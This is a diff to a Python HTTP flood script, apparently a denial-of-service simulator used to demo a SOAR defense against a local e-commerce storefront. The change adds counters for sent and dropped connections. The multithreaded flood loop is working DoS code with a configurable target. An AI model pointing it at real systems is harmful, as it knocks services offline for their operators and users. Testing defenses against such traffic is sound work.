@@ -11,8 +11,12 @@ import threading
 import argparse
 
 stop_event = threading.Event()
+sent_count = 0
+dropped_count = 0
+counter_lock = threading.Lock()
 
 def flood_worker(target_ip: str, target_port: int, worker_id: int):
+    global sent_count, dropped_count
     payload = (
         b"GET /api/checkout HTTP/1.1\r\n"
         b"Host: " + target_ip.encode() + b"\r\n"
@@ -24,15 +28,31 @@ def flood_worker(target_ip: str, target_port: int, worker_id: int):
     while not stop_event.is_set():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.5)
+            s.settimeout(0.4)
             s.connect((target_ip, target_port))
             s.sendall(payload)
+            with counter_lock:
+                sent_count += 1
+            # If server or SOAR severs connection
+            resp = s.recv(64)
+            if not resp:
+                with counter_lock:
+                    dropped_count += 1
             s.close()
+        except (ConnectionResetError, ConnectionRefusedError, BrokenPipeError, socket.timeout):
+            with counter_lock:
+                dropped_count += 1
+            time.sleep(0.01)
         except Exception:
-            pass
+            with counter_lock:
+                dropped_count += 1
         time.sleep(0.001)
 
 def start_traffic_flood(target_ip: str = "127.0.0.1", target_port: int = 5000, threads: int = 24, duration: int = 10):
+    global sent_count, dropped_count
+    sent_count = 0
+    dropped_count = 0
+
     print(f"==================================================")
     print(f"[ATTACK SIMULATION] Launching High-Density Traffic Surge on {target_ip}:{target_port}")
     print(f"Target: Port {target_port} (E-Commerce Demo Storefront / API)")
@@ -49,14 +69,19 @@ def start_traffic_flood(target_ip: str = "127.0.0.1", target_port: int = 5000, t
         
     try:
         for remaining in range(duration, 0, -1):
-            sys.stdout.write(f"\r[⚡] Flood surge active on port {target_port}... {remaining}s remaining (Press Ctrl+C to abort) ")
+            with counter_lock:
+                curr_sent = sent_count
+                curr_dropped = dropped_count
+            soar_indicator = f" | 🛡️ Neutralized by SOAR: {curr_dropped}" if curr_dropped > 0 else ""
+            sys.stdout.write(f"\r[⚡] Flood Surge: {curr_sent} pkts sent{soar_indicator} ({remaining}s remaining) ")
             sys.stdout.flush()
             time.sleep(1)
     except KeyboardInterrupt:
         print("\nAborted by user.")
         
     stop_event.set()
-    print(f"\n[✓] Traffic flood simulation on {target_ip}:{target_port} finished.")
+    with counter_lock:
+        print(f"\n[✓] Traffic flood finished. Total Sent: {sent_count} | Dropped / Isolated by SOAR: {dropped_count}")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Chakravyuh AI: High-Density Traffic / DoS Flood Simulator")
